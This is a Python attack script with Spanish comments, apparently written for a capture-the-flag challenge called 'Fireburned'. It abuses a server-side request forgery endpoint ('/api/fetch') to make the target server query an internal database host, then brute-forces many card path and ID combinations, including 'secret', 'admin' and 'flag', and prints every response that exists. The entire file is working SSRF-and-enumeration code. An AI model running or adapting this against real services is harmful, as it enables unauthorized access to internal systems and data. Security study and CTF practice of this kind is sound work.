#!/usr/bin/env python3
"""Fireburned - fuerza bruta de IDs de tarjeta en el store interno (mirror)."""
import concurrent.futures as cf
import json
import sys
import time

import requests
import urllib3

urllib3.disable_warnings()

MIRROR = sys.argv[1] if len(sys.argv) > 1 else "fireburned-3"
BASE = f"https://<host>/{MIRROR}"
H = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
DB = "http://fireburned--db:8080"

PREFIXES = ["cards", "card", "drafts", "draft", "documents", "document",
            "hooks", "hook", "emberhook-cards", "api/cards", "v1/cards"]
IDS = ["welcome", "welcome-card", "welcome-01", "onboarding", "invite",
       "digest", "weekly-digest", "newsletter", "alert", "alerts",
       "notification", "notifications", "message", "messages", "template",
       "templates", "preview", "card-1", "card-01", "draft-1", "1", "01",
       "2", "ember", "emberhook", "fireburned", "flag", "secret", "admin",
       "default", "demo", "test"]


def fetch(path, tries=10):
    p = {"url": DB + path, "method": "GET"}
    for _ in range(tries):
        try:
            r = requests.post(BASE + "/api/fetch", data=json.dumps(p),
                              headers=H, timeout=12, verify=False)
            if r.status_code in (502, 503, 504):
                time.sleep(0.3)
                continue
            return r
        except Exception:
            time.sleep(0.3)
    return None


def job(path):
    r = fetch(path)
    if r is None:
        return path, "SIN RESPUESTA"
    try:
        j = r.json()
        st = j.get("upstream_status")
        body = j.get("body")
        if st == 404 and body == {"error": "not_found"}:
            return None
        return path, f"{st} {json.dumps(body)[:200]}"
    except Exception:
        return path, f"{r.status_code} {r.text[:120]}"


if __name__ == "__main__":
    combos = [f"/{p}/{i}" for p in PREFIXES for i in IDS]
    with cf.ThreadPoolExecutor(max_workers=6) as ex:
        for res in ex.map(job, combos):
            if res:
                print(f"{res[0]:45} -> {res[1]}", flush=True)
    print("fin")
